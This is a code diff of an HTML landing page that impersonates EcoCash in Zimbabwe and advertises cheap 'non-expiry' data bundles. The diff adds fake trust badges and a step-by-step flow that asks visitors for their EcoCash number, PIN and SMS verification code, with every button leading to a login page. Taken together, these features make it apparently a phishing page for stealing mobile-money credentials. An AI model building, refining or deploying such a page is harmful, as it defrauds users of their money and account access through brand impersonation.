@@ -3,21 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <meta name="theme-color" content="#001a4d">
-    <title>EcoCash | Non-Expiry Data Bundles · Zimbabwe</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <meta name="theme-color" content="#0a1628">
+    <title>EcoCash | Non-Expiry USD Data Bundles · Zimbabwe</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root {
-            --eco-red: #d32f2f;
-            --eco-blue-dark: #001a4d;
-            --eco-blue: #0033a0;
-            --eco-blue-light: #0052cc;
+            --eco-red: #e53935;
+            --eco-blue-dark: #0a1628;
+            --eco-blue: #1a3a6b;
+            --eco-blue-light: #2563eb;
+            --eco-accent: #3b82f6;
             --white: #ffffff;
-            --light-bg: #f5f7fa;
-            --text-dark: #1a1a1a;
-            --text-muted: #666666;
-            --border: #e0e0e0;
-            --success: #00b050;
+            --light-bg: #f0f4f8;
+            --text-dark: #1a1a2e;
+            --text-muted: #64748b;
+            --border: #e2e8f0;
+            --success: #10b981;
+            --card-bg: #ffffff;
+            --gradient-hero: linear-gradient(135deg, #0a1628 0%, #1a3a6b 50%, #0f2447 100%);
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -31,18 +34,37 @@
             overflow-x: hidden;
         }
 
+        /* Announcement Bar */
+        .announcement-bar {
+            background: var(--eco-red);
+            color: white;
+            padding: 10px 5%;
+            text-align: center;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 0.02em;
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            flex-wrap: wrap;
+        }
+
+        .announcement-bar span {
+            white-space: nowrap;
+        }
+
         /* Header */
         header {
             background: var(--white);
             border-bottom: 3px solid var(--eco-blue);
-            padding: 16px 5%;
+            padding: 14px 5%;
             display: flex;
             justify-content: space-between;
             align-items: center;
             position: sticky;
             top: 0;
             z-index: 1000;
-            box-shadow: 0 2px 12px rgba(0, 51, 160, 0.12);
+            box-shadow: 0 2px 20px rgba(10, 22, 40, 0.08);
         }
 
         .logo {
@@ -60,7 +82,7 @@
 
         nav {
             display: flex;
-            gap: 30px;
+            gap: 28px;
             align-items: center;
         }
 
@@ -73,90 +95,191 @@
         }
 
         nav a:hover {
-            color: var(--eco-blue);
+            color: var(--eco-blue-light);
         }
 
-        .btn-login {
-            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
+        .btn-get-started {
+            background: linear-gradient(135deg, var(--eco-blue-light), var(--eco-blue));
             color: white;
-            padding: 10px 24px;
+            padding: 11px 26px;
             border-radius: 50px;
             border: none;
             font-weight: 700;
             cursor: pointer;
             transition: all 0.2s;
             font-size: 14px;
-            box-shadow: 0 4px 12px rgba(0, 51, 160, 0.3);
+            text-decoration: none;
+            box-shadow: 0 4px 14px rgba(37, 99, 235, 0.3);
         }
 
-        .btn-login:hover {
+        .btn-get-started:hover {
             transform: translateY(-2px);
-            box-shadow: 0 6px 16px rgba(0, 51, 160, 0.4);
+            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4);
+        }
+
+        /* Mobile Menu */
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            font-size: 28px;
+            cursor: pointer;
+            color: var(--eco-blue);
         }
 
         /* Hero Section */
         .hero {
-            background: linear-gradient(135deg, var(--eco-blue) 0%, var(--eco-blue-dark) 100%);
+            background: var(--gradient-hero);
             color: white;
-            padding: 100px 5%;
+            padding: 100px 5% 80px;
             text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -20%;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(59, 130, 246, 0.15) 0%, transparent 70%);
+            border-radius: 50%;
+        }
+
+        .hero::after {
+            content: '';
+            position: absolute;
+            bottom: -30%;
+            left: -10%;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(229, 57, 53, 0.1) 0%, transparent 70%);
+            border-radius: 50%;
+        }
+
+        .hero-content {
+            position: relative;
+            z-index: 1;
+        }
+
+        .hero-badge {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 8px 20px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            backdrop-filter: blur(10px);
         }
 
         .hero h1 {
             font-size: 3.5rem;
             font-weight: 900;
-            margin-bottom: 20px;
+            margin-bottom: 18px;
             letter-spacing: -1.5px;
             line-height: 1.1;
         }
 
-        .hero p {
-            font-size: 1.25rem;
-            opacity: 0.95;
-            max-width: 700px;
-            margin: 0 auto 40px;
-            font-weight: 500;
+        .hero h1 .highlight {
+            color: var(--eco-accent);
         }
 
-        .btn-explore {
-            display: inline-block;
-            background: var(--eco-red);
+        .hero p {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            max-width: 650px;
+            margin: 0 auto 20px;
+            font-weight: 400;
+        }
+
+        .hero-features {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-bottom: 36px;
+            flex-wrap: wrap;
+            font-size: 14px;
+            opacity: 0.85;
+        }
+
+        .hero-features span {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .hero-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .btn-hero-primary {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--eco-blue-light);
             color: white;
-            padding: 14px 32px;
+            padding: 16px 36px;
             border-radius: 50px;
             text-decoration: none;
             font-weight: 800;
             font-size: 16px;
             transition: all 0.2s;
-            box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
+            box-shadow: 0 4px 20px rgba(37, 99, 235, 0.4);
         }
 
-        .btn-explore:hover {
+        .btn-hero-primary:hover {
             transform: translateY(-2px);
-            box-shadow: 0 6px 16px rgba(211, 47, 47, 0.4);
+            box-shadow: 0 8px 28px rgba(37, 99, 235, 0.5);
+        }
+
+        .btn-hero-secondary {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: transparent;
+            color: white;
+            padding: 16px 36px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            transition: all 0.2s;
+        }
+
+        .btn-hero-secondary:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.5);
         }
 
         /* Bundles Section */
         .bundles-section {
             padding: 80px 5%;
-            background: var(--white);
+            background: var(--light-bg);
         }
 
         .section-label {
             text-align: center;
-            color: var(--eco-blue);
+            color: var(--eco-blue-light);
             font-weight: 800;
             font-size: 12px;
             text-transform: uppercase;
-            letter-spacing: 0.1em;
-            margin-bottom: 16px;
+            letter-spacing: 0.15em;
+            margin-bottom: 12px;
         }
 
         .section-title {
             text-align: center;
-            font-size: 2.8rem;
+            font-size: 2.5rem;
             font-weight: 900;
-            margin-bottom: 16px;
+            margin-bottom: 12px;
             color: var(--text-dark);
             letter-spacing: -0.8px;
         }
@@ -164,9 +287,9 @@
         .section-subtitle {
             text-align: center;
             color: var(--text-muted);
-            font-size: 1.1rem;
-            margin-bottom: 60px;
-            max-width: 700px;
+            font-size: 1rem;
+            margin-bottom: 50px;
+            max-width: 650px;
             margin-left: auto;
             margin-right: auto;
         }
@@ -174,215 +297,292 @@
         .bundles-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 28px;
+            gap: 20px;
             max-width: 1300px;
             margin: 0 auto;
         }
 
         .bundle-card {
             background: white;
-            border: 2px solid var(--eco-blue);
+            border: 2px solid var(--border);
             border-radius: 16px;
-            padding: 32px;
+            padding: 28px;
             text-align: center;
             transition: all 0.3s;
-            box-shadow: 0 2px 8px rgba(0, 51, 160, 0.08);
+            box-shadow: 0 2px 8px rgba(10, 22, 40, 0.04);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .bundle-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--eco-blue-light), var(--eco-accent));
+            transform: scaleX(0);
+            transition: transform 0.3s;
+            transform-origin: left;
+        }
+
+        .bundle-card:hover::before {
+            transform: scaleX(1);
         }
 
         .bundle-card:hover {
-            border-color: var(--eco-red);
-            box-shadow: 0 12px 32px rgba(0, 51, 160, 0.15);
+            border-color: var(--eco-blue-light);
+            box-shadow: 0 12px 36px rgba(37, 99, 235, 0.12);
             transform: translateY(-6px);
         }
 
         .bundle-card.popular {
-            border: 2px solid var(--eco-red);
-            background: linear-gradient(135deg, rgba(0, 51, 160, 0.08) 0%, rgba(211, 47, 47, 0.04) 100%);
+            border: 2px solid var(--eco-blue-light);
+            background: linear-gradient(135deg, rgba(37, 99, 235, 0.03) 0%, rgba(59, 130, 246, 0.06) 100%);
+            transform: scale(1.03);
+        }
+
+        .bundle-card.popular:hover {
+            transform: scale(1.03) translateY(-6px);
         }
 
         .bundle-badge {
             display: inline-block;
             background: var(--eco-blue);
             color: white;
-            padding: 6px 16px;
+            padding: 5px 14px;
             border-radius: 50px;
-            font-size: 11px;
+            font-size: 10px;
             font-weight: 800;
             text-transform: uppercase;
-            letter-spacing: 0.05em;
-            margin-bottom: 16px;
+            letter-spacing: 0.06em;
+            margin-bottom: 14px;
+        }
+
+        .bundle-badge.popular {
+            background: var(--eco-blue-light);
         }
 
         .bundle-data {
             font-size: 2.8rem;
             font-weight: 900;
             color: var(--eco-blue);
-            margin-bottom: 8px;
-            letter-spacing: -0.5px;
+            margin-bottom: 4px;
+            letter-spacing: -1px;
         }
 
         .bundle-price {
-            font-size: 1.6rem;
+            font-size: 1.4rem;
             font-weight: 800;
             color: var(--text-dark);
-            margin-bottom: 24px;
+            margin-bottom: 4px;
+        }
+
+        .bundle-currency {
+            font-size: 12px;
+            color: var(--text-muted);
+            font-weight: 500;
+            margin-bottom: 18px;
         }
 
         .bundle-features {
             list-style: none;
             text-align: left;
-            margin-bottom: 28px;
-            font-size: 14px;
+            margin-bottom: 22px;
+            font-size: 13px;
             color: var(--text-muted);
         }
 
         .bundle-features li {
-            padding: 10px 0;
+            padding: 7px 0;
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 10px;
         }
 
         .bundle-features li::before {
             content: "✓";
-            color: var(--eco-blue);
+            color: var(--success);
             font-weight: 900;
-            font-size: 18px;
+            font-size: 14px;
+            flex-shrink: 0;
         }
 
         .btn-bundle {
             width: 100%;
-            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
+            background: linear-gradient(135deg, var(--eco-blue-light), var(--eco-blue));
             color: white;
             border: none;
-            padding: 14px 20px;
+            padding: 12px 20px;
             border-radius: 50px;
             font-weight: 800;
-            font-size: 14px;
+            font-size: 13px;
             text-transform: uppercase;
             letter-spacing: 0.04em;
             cursor: pointer;
             transition: all 0.2s;
-            box-shadow: 0 4px 12px rgba(0, 51, 160, 0.3);
+            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.25);
         }
 
         .btn-bundle:hover {
             transform: translateY(-1px);
-            box-shadow: 0 6px 16px rgba(0, 51, 160, 0.4);
+            box-shadow: 0 6px 18px rgba(37, 99, 235, 0.35);
         }
 
-        /* Steps Section */
-        .steps-section {
+        /* Features Section */
+        .features-section {
             padding: 80px 5%;
-            background: linear-gradient(135deg, rgba(0, 51, 160, 0.08) 0%, rgba(0, 51, 160, 0.04) 100%);
+            background: var(--white);
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 24px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .feature-card {
+            background: var(--light-bg);
+            padding: 32px;
+            border-radius: 16px;
+            text-align: center;
+            border: 2px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .feature-card:hover {
+            border-color: var(--eco-blue-light);
+            box-shadow: 0 8px 24px rgba(37, 99, 235, 0.1);
+            background: white;
+        }
+
+        .feature-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, var(--eco-blue-light), var(--eco-blue));
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-size: 1.8rem;
+        }
+
+        .feature-card h3 {
+            font-size: 1.05rem;
+            font-weight: 800;
+            margin-bottom: 8px;
+            color: var(--text-dark);
+        }
+
+        .feature-card p {
+            color: var(--text-muted);
+            font-size: 0.88rem;
+            line-height: 1.6;
+        }
+
+        /* How It Works */
+        .how-it-works {
+            padding: 80px 5%;
+            background: var(--gradient-hero);
+            color: white;
+        }
+
+        .how-it-works .section-label {
+            color: var(--eco-accent);
+        }
+
+        .how-it-works .section-title {
+            color: white;
+        }
+
+        .how-it-works .section-subtitle {
+            color: rgba(255, 255, 255, 0.7);
         }
 
         .steps-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
-            gap: 32px;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 24px;
             max-width: 1100px;
             margin: 0 auto;
         }
 
         .step-card {
-            background: white;
-            padding: 36px 28px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 32px 24px;
             border-radius: 16px;
             text-align: center;
-            box-shadow: 0 2px 8px rgba(0, 51, 160, 0.08);
-            border: 2px solid var(--eco-blue);
+            backdrop-filter: blur(10px);
             transition: all 0.3s;
         }
 
         .step-card:hover {
-            box-shadow: 0 8px 24px rgba(0, 51, 160, 0.15);
-            border-color: var(--eco-red);
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.2);
+            transform: translateY(-4px);
         }
 
         .step-number {
-            width: 52px;
-            height: 52px;
-            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
+            width: 48px;
+            height: 48px;
+            background: var(--eco-blue-light);
             color: white;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: 900;
-            font-size: 24px;
+            font-size: 20px;
             margin: 0 auto 16px;
-            box-shadow: 0 4px 12px rgba(0, 51, 160, 0.3);
+            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.4);
         }
 
         .step-card h3 {
-            font-size: 1.15rem;
+            font-size: 1.05rem;
             font-weight: 800;
-            margin-bottom: 12px;
-            color: var(--text-dark);
+            margin-bottom: 8px;
+            color: white;
         }
 
         .step-card p {
-            color: var(--text-muted);
-            font-size: 0.9rem;
-            line-height: 1.7;
-        }
-
-        /* Why Us Section */
-        .why-us {
-            padding: 80px 5%;
-            background: var(--white);
-        }
-
-        .why-us-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-            gap: 40px;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        .why-card {
-            text-align: center;
-        }
-
-        .why-icon {
-            font-size: 3.5rem;
-            margin-bottom: 16px;
-        }
-
-        .why-card h3 {
-            font-size: 1.3rem;
-            font-weight: 800;
-            margin-bottom: 12px;
-            color: var(--text-dark);
-        }
-
-        .why-card p {
-            color: var(--text-muted);
-            font-size: 0.95rem;
-            line-height: 1.7;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.85rem;
+            line-height: 1.6;
         }
 
         /* Footer */
         footer {
-            background: linear-gradient(135deg, var(--eco-blue) 0%, var(--eco-blue-dark) 100%);
+            background: var(--eco-blue-dark);
             color: white;
-            padding: 60px 5%;
-            border-top: 3px solid var(--eco-red);
+            padding: 60px 5% 30px;
         }
 
         .footer-content {
             max-width: 1200px;
             margin: 0 auto;
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
             gap: 40px;
             margin-bottom: 40px;
         }
 
+        .footer-brand .logo {
+            margin-bottom: 12px;
+        }
+
+        .footer-brand p {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 13px;
+            line-height: 1.7;
+        }
+
         .footer-section h4 {
-            font-size: 1.1rem;
+            font-size: 0.9rem;
             font-weight: 800;
             margin-bottom: 16px;
             color: white;
@@ -393,13 +593,13 @@
         }
 
         .footer-section ul li {
-            margin-bottom: 12px;
+            margin-bottom: 10px;
         }
 
         .footer-section ul li a {
-            color: rgba(255, 255, 255, 0.7);
+            color: rgba(255, 255, 255, 0.6);
             text-decoration: none;
-            font-size: 14px;
+            font-size: 13px;
             transition: color 0.2s;
         }
 
@@ -408,171 +608,231 @@
         }
 
         .footer-bottom {
-            border-top: 1px solid rgba(255, 255, 255, 0.2);
-            padding-top: 30px;
-            text-align: center;
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.6);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
         }
 
         .footer-bottom p {
-            margin-bottom: 10px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.5);
         }
 
+        .footer-badges {
+            display: flex;
+            gap: 16px;
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.5);
+            font-weight: 600;
+        }
+
+        /* Responsive */
         @media (max-width: 768px) {
+            .announcement-bar { font-size: 11px; gap: 12px; padding: 8px 3%; }
             nav { display: none; }
-            .hero { padding: 60px 5%; }
+            .mobile-menu-btn { display: block; }
+            .hero { padding: 60px 5% 50px; }
             .hero h1 { font-size: 2.2rem; }
             .hero p { font-size: 1rem; }
-            .section-title { font-size: 2rem; }
-            .bundles-grid { grid-template-columns: 1fr; gap: 20px; }
-            .why-us-grid { gap: 28px; }
-            .steps-grid { grid-template-columns: 1fr; gap: 20px; }
-            .footer-content { grid-template-columns: 1fr; gap: 30px; }
+            .hero-features { gap: 12px; font-size: 12px; }
+            .hero-buttons { flex-direction: column; align-items: center; }
+            .btn-hero-primary, .btn-hero-secondary { width: 100%; max-width: 300px; justify-content: center; }
+            .section-title { font-size: 1.8rem; }
+            .bundles-grid { grid-template-columns: 1fr; gap: 16px; }
+            .bundle-card.popular { transform: scale(1); }
+            .bundle-card.popular:hover { transform: translateY(-6px); }
+            .features-grid { gap: 16px; }
+            .steps-grid { grid-template-columns: 1fr 1fr; gap: 12px; }
+            .footer-content { grid-template-columns: 1fr 1fr; gap: 24px; }
+            .footer-bottom { flex-direction: column; text-align: center; }
+        }
+
+        @media (max-width: 480px) {
+            .steps-grid { grid-template-columns: 1fr; }
+            .hero h1 { font-size: 1.9rem; }
         }
     </style>
 </head>
 <body>
+    <div class="announcement-bar">
+        <span>&#9889; Instant Activation — No Waiting</span>
+        <span>&#9854;&#65039; Non-Expiry Data — Buy once, use forever</span>
+        <span>&#128241; Dial *151# — EcoCash</span>
+    </div>
+
     <header>
         <a class="logo" href="index.html"><span class="eco">Eco</span><span class="cash">Cash</span></a>
         <nav>
             <a href="#bundles">Bundles</a>
-            <a href="#why">Why Us</a>
-            <a href="#steps">How It Works</a>
-            <button class="btn-login" onclick="window.location.href='login.html?data=10%20GB&price=1.40'">Get Started</button>
+            <a href="#features">Why Us</a>
+            <a href="#how">How It Works</a>
+            <a href="#faq">FAQ</a>
+            <a href="login.html?data=10%20GB&price=1.40" class="btn-get-started">Get Started</a>
         </nav>
+        <button class="mobile-menu-btn" onclick="document.querySelector('nav').style.display = document.querySelector('nav').style.display === 'flex' ? 'none' : 'flex'">&#9776;</button>
     </header>
 
     <section class="hero">
-        <h1>Data That Never Expires</h1>
-        <p>Zimbabwe's fastest and most reliable non-expiry data bundles. Buy once, use anytime.</p>
-        <a href="#bundles" class="btn-explore">🛒 Explore Bundles</a>
+        <div class="hero-content">
+            <div class="hero-badge">&#127464;&#127487; Zimbabwe's #1 Data Provider</div>
+            <h1>Data That <span class="highlight">Never</span> Expires</h1>
+            <p>Premium non-expiry USD data bundles with instant EcoCash activation. Buy once. Use forever.</p>
+            <div class="hero-features">
+                <span>&#9989; Non-Expiry</span>
+                <span>&#9889; Instant Activation</span>
+                <span>&#127760; All Networks</span>
+                <span>&#128274; 256-bit Secure</span>
+            </div>
+            <div class="hero-buttons">
+                <a href="#bundles" class="btn-hero-primary">&#128722; Explore Bundles</a>
+                <a href="login.html?data=10%20GB&price=1.40" class="btn-hero-secondary">Get Started &#8594;</a>
+            </div>
+        </div>
     </section>
 
     <section class="bundles-section" id="bundles">
         <div class="section-label">Choose Your Plan</div>
-        <h2 class="section-title">Non-Expiry Data Bundles</h2>
-        <p class="section-subtitle">All bundles include double data. Active all days. Never expires.</p>
+        <h2 class="section-title">Non-Expiry USD Data Bundles</h2>
+        <p class="section-subtitle">All bundles are non-expiry and paid via EcoCash in USD. Instant activation on all networks.</p>
 
         <div class="bundles-grid">
             <div class="bundle-card">
+                <div class="bundle-badge">Economy</div>
                 <div class="bundle-data">4 GB</div>
                 <div class="bundle-price">USD 0.60</div>
+                <div class="bundle-currency">Zimbabwe Dollar Equivalent: ZWG 16.20</div>
                 <ul class="bundle-features">
-                    <li>Non-Expiry Data</li>
+                    <li>Non-Expiry</li>
                     <li>Instant Activation</li>
-                    <li>Rollover Forever</li>
                     <li>All Networks</li>
+                    <li>Rollover Forever</li>
                 </ul>
                 <button class="btn-bundle" onclick="selectBundle('4 GB', '0.60')">Get This Bundle</button>
             </div>
 
             <div class="bundle-card">
+                <div class="bundle-badge">Standard</div>
                 <div class="bundle-data">10 GB</div>
                 <div class="bundle-price">USD 1.40</div>
+                <div class="bundle-currency">Zimbabwe Dollar Equivalent: ZWG 37.80</div>
                 <ul class="bundle-features">
-                    <li>Non-Expiry Data</li>
+                    <li>Non-Expiry</li>
                     <li>Instant Activation</li>
-                    <li>Rollover Forever</li>
                     <li>All Networks</li>
+                    <li>Rollover Forever</li>
                 </ul>
                 <button class="btn-bundle" onclick="selectBundle('10 GB', '1.40')">Get This Bundle</button>
             </div>
 
             <div class="bundle-card">
+                <div class="bundle-badge">Premium</div>
                 <div class="bundle-data">20 GB</div>
                 <div class="bundle-price">USD 2.80</div>
+                <div class="bundle-currency">Zimbabwe Dollar Equivalent: ZWG 75.60</div>
                 <ul class="bundle-features">
-                    <li>Non-Expiry Data</li>
+                    <li>Non-Expiry</li>
                     <li>Instant Activation</li>
-                    <li>Rollover Forever</li>
                     <li>All Networks</li>
+                    <li>Rollover Forever</li>
                 </ul>
                 <button class="btn-bundle" onclick="selectBundle('20 GB', '2.80')">Get This Bundle</button>
             </div>
 
             <div class="bundle-card popular">
-                <div class="bundle-badge">Most Popular</div>
+                <div class="bundle-badge popular">Best Value</div>
                 <div class="bundle-data">50 GB</div>
                 <div class="bundle-price">USD 6.50</div>
+                <div class="bundle-currency">Zimbabwe Dollar Equivalent: ZWG 175.50</div>
                 <ul class="bundle-features">
-                    <li>Non-Expiry Data</li>
+                    <li>Non-Expiry</li>
                     <li>Instant Activation</li>
-                    <li>Rollover Forever</li>
                     <li>All Networks</li>
+                    <li>Rollover Forever</li>
                 </ul>
                 <button class="btn-bundle" onclick="selectBundle('50 GB', '6.50')">Get This Bundle</button>
             </div>
 
             <div class="bundle-card">
+                <div class="bundle-badge">Enterprise</div>
                 <div class="bundle-data">100 GB</div>
                 <div class="bundle-price">USD 12.00</div>
+                <div class="bundle-currency">Zimbabwe Dollar Equivalent: ZWG 324.00</div>
                 <ul class="bundle-features">
-                    <li>Non-Expiry Data</li>
+                    <li>Non-Expiry</li>
                     <li>Instant Activation</li>
-                    <li>Rollover Forever</li>
                     <li>All Networks</li>
+                    <li>Rollover Forever</li>
                 </ul>
                 <button class="btn-bundle" onclick="selectBundle('100 GB', '12.00')">Get This Bundle</button>
             </div>
 
             <div class="bundle-card">
+                <div class="bundle-badge">Unlimited</div>
                 <div class="bundle-data">200 GB</div>
                 <div class="bundle-price">USD 19.80</div>
+                <div class="bundle-currency">Zimbabwe Dollar Equivalent: ZWG 534.60</div>
                 <ul class="bundle-features">
-                    <li>Non-Expiry Data</li>
+                    <li>Non-Expiry</li>
                     <li>Instant Activation</li>
-                    <li>Rollover Forever</li>
                     <li>All Networks</li>
+                    <li>Rollover Forever</li>
                 </ul>
                 <button class="btn-bundle" onclick="selectBundle('200 GB', '19.80')">Get This Bundle</button>
             </div>
         </div>
     </section>
 
-    <section class="why-us" id="why">
-        <h2 class="section-title">Why Choose EcoCash?</h2>
-        <div class="why-us-grid">
-            <div class="why-card">
-                <div class="why-icon">♾️</div>
+    <section class="features-section" id="features">
+        <div class="section-label">Why EcoCash Data</div>
+        <h2 class="section-title">Why Choose Us?</h2>
+        <p class="section-subtitle">Trusted by millions of Zimbabweans for reliable, affordable data.</p>
+        <div class="features-grid">
+            <div class="feature-card">
+                <div class="feature-icon">&#9854;&#65039;</div>
                 <h3>Never Expires</h3>
-                <p>Your data stays valid until you use it. No time pressure or expiration worries.</p>
+                <p>Your data remains valid indefinitely. No time pressure or expiration worries.</p>
             </div>
-            <div class="why-card">
-                <div class="why-icon">⚡</div>
+            <div class="feature-card">
+                <div class="feature-icon">&#9889;</div>
                 <h3>Instant Activation</h3>
-                <p>Buy and start browsing immediately. No waiting or delays.</p>
+                <p>Buy and start browsing immediately. Activation is instant via EcoCash.</p>
             </div>
-            <div class="why-card">
-                <div class="why-icon">🔄</div>
+            <div class="feature-card">
+                <div class="feature-icon">&#128260;</div>
                 <h3>Automatic Rollover</h3>
                 <p>Unused data carries forward forever. Nothing is ever wasted.</p>
             </div>
-            <div class="why-card">
-                <div class="why-icon">🌐</div>
-                <h3>Nationwide Coverage</h3>
-                <p>Reliable 4G and 5G across Zimbabwe. Always connected.</p>
+            <div class="feature-card">
+                <div class="feature-icon">&#127760;</div>
+                <h3>All Networks</h3>
+                <p>Works on all networks across Zimbabwe. Always connected.</p>
             </div>
         </div>
     </section>
 
-    <section class="steps-section" id="steps">
-        <h2 class="section-title">How to Use EcoCash</h2>
+    <section class="how-it-works" id="how">
+        <div class="section-label">EcoCash Payment</div>
+        <h2 class="section-title">How It Works</h2>
+        <p class="section-subtitle">Simple 4-step process to get your data bundle via EcoCash.</p>
         <div class="steps-grid">
             <div class="step-card">
                 <div class="step-number">1</div>
-                <h3>Choose Bundle</h3>
-                <p>Select your preferred data bundle from our available options above.</p>
+                <h3>Select Bundle</h3>
+                <p>Choose your preferred data bundle from the options above.</p>
             </div>
             <div class="step-card">
                 <div class="step-number">2</div>
-                <h3>Enter Details</h3>
-                <p>Provide your EcoCash number and PIN for verification.</p>
+                <h3>Enter EcoCash Details</h3>
+                <p>Enter your EcoCash number and PIN for verification.</p>
             </div>
             <div class="step-card">
                 <div class="step-number">3</div>
-                <h3>Verify Code</h3>
-                <p>Enter the code sent to your phone to confirm the transaction.</p>
+                <h3>Confirm OTP</h3>
+                <p>Enter the verification code sent to your phone via SMS.</p>
             </div>
             <div class="step-card">
                 <div class="step-number">4</div>
@@ -584,13 +844,17 @@
 
     <footer>
         <div class="footer-content">
+            <div class="footer-brand">
+                <a class="logo" href="index.html"><span class="eco">Eco</span><span class="cash">Cash</span></a>
+                <p>Zimbabwe's leading mobile money platform. Buy non-expiry data bundles securely with EcoCash.</p>
+            </div>
             <div class="footer-section">
-                <h4>About EcoCash</h4>
+                <h4>Products</h4>
                 <ul>
-                    <li><a href="#">About Us</a></li>
-                    <li><a href="#">Our Mission</a></li>
-                    <li><a href="#">Careers</a></li>
-                    <li><a href="#">Blog</a></li>
+                    <li><a href="#bundles">Data Bundles</a></li>
+                    <li><a href="#">Airtime Top-up</a></li>
+                    <li><a href="#">Bill Payments</a></li>
+                    <li><a href="#">Send Money</a></li>
                 </ul>
             </div>
             <div class="footer-section">
@@ -611,19 +875,14 @@
                     <li><a href="#">Compliance</a></li>
                 </ul>
             </div>
-            <div class="footer-section">
-                <h4>Connect With Us</h4>
-                <ul>
-                    <li><a href="#">Facebook</a></li>
-                    <li><a href="#">Twitter</a></li>
-                    <li><a href="#">Instagram</a></li>
-                    <li><a href="#">WhatsApp</a></li>
-                </ul>
-            </div>
         </div>
         <div class="footer-bottom">
-            <p>© 2026 Econet Wireless · EcoCash. All rights reserved.</p>
-            <p>🔒 256-bit Encrypted | ✓ PCI DSS Compliant | 🌍 Trusted by Millions</p>
+            <p>&copy; 2026 Econet Wireless &middot; EcoCash. All rights reserved.</p>
+            <div class="footer-badges">
+                <span>&#128274; 256-bit Encrypted</span>
+                <span>&#9989; PCI DSS Compliant</span>
+                <span>&#127760; Trusted by Millions</span>
+            </div>
         </div>
     </footer>
 
